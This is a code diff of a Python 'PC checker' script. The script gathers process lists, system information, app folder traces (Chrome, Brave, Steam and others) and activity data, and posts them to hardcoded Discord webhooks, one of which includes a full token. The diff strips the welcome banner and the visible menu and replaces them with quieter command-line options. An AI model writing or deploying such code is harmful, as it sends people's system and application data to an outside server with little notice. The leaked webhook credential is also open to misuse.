@@ -1,12 +1,10 @@
-import os
 import sys
 import requests
 import psutil
 import platform
 import json
 from datetime import datetime
-import sqlite3
-import webbrowser
+import os
 
 # Define webhooks
 WEBHOOK_URLS = {
@@ -17,7 +15,6 @@ WEBHOOK_URLS = {
     'system_info': 'https://canary.discord.com/api/webhooks/1279407392379109497/15w0yvCeqmb64b7NqPgtFL8ZRwmqjMb3G1H0Mu0NX4nBXnwqoWTLGogQOSBVS6_2CoC_'
 }
 
-# Helper functions
 def send_webhook(url, message):
     try:
         response = requests.post(url, json={"content": message})
@@ -28,7 +25,6 @@ def send_webhook(url, message):
 def get_recent_activity(activity_type):
     message = f"Recent activity ({activity_type}):\n"
     # Implement detailed scanning based on activity_type (e.g., deleted, recent, renamed)
-    # This is a placeholder implementation; replace with actual logic.
     message += "Detailed activity information goes here."
     return message
 
@@ -89,48 +85,34 @@ def scan_files(file_choice):
     return message
 
 def main():
-    print("Welcome to the PC Checker Tool!")
-    print("1. Scan all processes and admin processes.")
-    print("2. Database search.")
-    print("3. Scan the PC.")
-    print("4. System information.")
-    print("5. Recent activity.")
-    print("6. Exit.")
+    if len(sys.argv) != 3:
+        print("Usage: python script.py <option> <delay>")
+        sys.exit(1)
     
-    choice = input("Enter your choice (1-6): ")
+    option = sys.argv[1]
+    delay = int(sys.argv[2])
     
-    # Get webhook delay
-    webhook_delay = int(input("Enter webhook delay in seconds: "))
-    
-    if choice == '1':
-        print("1. Scan all processes and admin processes.")
+    if option == '1':
         send_webhook(WEBHOOK_URLS['admin_processes'], scan_processes())
         send_webhook(WEBHOOK_URLS['traces'], scan_admin_processes())
-    elif choice == '2':
-        print("2. Database search.")
+    elif option == '2':
         send_webhook(WEBHOOK_URLS['database'], scan_database())
-    elif choice == '3':
-        print("3. Scan the PC.")
+    elif option == '3':
         print("Available options: steam, spotify, razer_cortex, razer_synapse, lghub, chrome, tiktok_live_studio, voicemeeterpro, brave, All")
         file_choice = input("Enter the file to scan or 'All': ")
         message = scan_files(file_choice)
         send_webhook(WEBHOOK_URLS['traces'], message)
-    elif choice == '4':
-        print("4. System information.")
+    elif option == '4':
         message = get_system_info()
         send_webhook(WEBHOOK_URLS['system_info'], message)
-    elif choice == '5':
-        print("5. Recent activity.")
+    elif option == '5':
         print("Options: deleted, recent, renamed")
         activity_choice = input("Enter the activity type: ")
         message = get_recent_activity(activity_choice)
         send_webhook(WEBHOOK_URLS['recent_activity'], message)
-    elif choice == '6':
-        print("Exiting...")
-        sys.exit()
     else:
-        print("Invalid choice. Exiting...")
-        sys.exit()
+        print("Invalid option.")
+        sys.exit(1)
 
 if __name__ == "__main__":
     main()
